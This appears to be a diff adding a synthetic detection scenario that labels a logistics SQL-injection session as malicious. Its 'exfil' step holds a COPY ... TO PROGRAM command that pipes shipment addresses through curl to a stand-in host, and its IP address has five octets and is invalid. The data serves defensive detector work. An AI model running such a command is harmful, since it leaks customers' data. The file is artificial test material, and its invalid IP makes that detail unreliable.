@@ -1,0 +1,32 @@
+scenario_id: gen_logistics_98_sql_injection_mal_2811m
+family_id: gen_logistics_98_sql_injection_fam_2811
+domain: logistics
+time_of_day: 03:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: probe
+    sql: SELECT dest_address FROM shipments WHERE shipment_id > 206374
+  - step_id: exfil
+    sql: COPY (SELECT dest_address FROM shipments) TO PROGRAM 'curl -sX POST https://clearinghouse-batch.example/ingest
+      -d @-'
+    connects_to:
+      ip: 91.219.236.63.108
+      port: 9001
+matched_pair_id: gen_logistics_98_sql_injection_pair_2811
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
